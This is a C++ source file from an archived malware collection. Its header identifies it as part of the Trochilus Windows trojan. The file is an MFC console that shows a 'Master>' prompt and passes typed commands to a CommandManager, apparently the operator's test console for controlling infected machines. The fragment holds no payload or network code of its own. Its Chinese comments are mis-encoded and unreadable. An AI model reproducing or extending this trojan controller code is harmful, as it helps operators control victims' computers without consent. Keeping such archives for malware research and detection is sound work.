/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
// TestMaster.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "CommandManager.h"
#include "TestMaster.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// Ψһ��Ӧ�ó������

CWinApp theApp;

using namespace std;

void RawMain()
{
	CommandManager::GetInstanceRef().Init();

	//StartMasterWorking();

	char cmdline[512] = {0};
	printf("type exit to end.\n");
	printf("Master>");
	gets_s(cmdline);
	CStringA cmd(cmdline);
	cmd.Trim();
	while (cmd != "exit")
	{
		if (cmd.GetLength() > 0)
		{
			tstring replyText;
			BOOL bOK = CommandManager::GetInstanceRef().Execute(CString(cmd), replyText);
			if (bOK)
			{
				printf("%s\n", t2a(replyText.c_str()));
			}
			else
			{
				printf("Error : %s\n", t2a(replyText.c_str()));
			}
		}

		ZeroMemory(cmdline, sizeof(cmdline));
		printf("Master>");
		gets_s(cmdline);
		cmd = cmdline;
		cmd.Trim();
	}
}

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// ��ʼ�� MFC ����ʧ��ʱ��ʾ����
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: ���Ĵ�������Է���������Ҫ
			_tprintf(_T("����: MFC ��ʼ��ʧ��\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: �ڴ˴�ΪӦ�ó������Ϊ��д���롣
			RawMain();
			//system("")
		}
	}
	else
	{
		// TODO: ���Ĵ�������Է���������Ҫ
		_tprintf(_T("����: GetModuleHandle ʧ��\n"));
		nRetCode = 1;
	}

	return nRetCode;
}
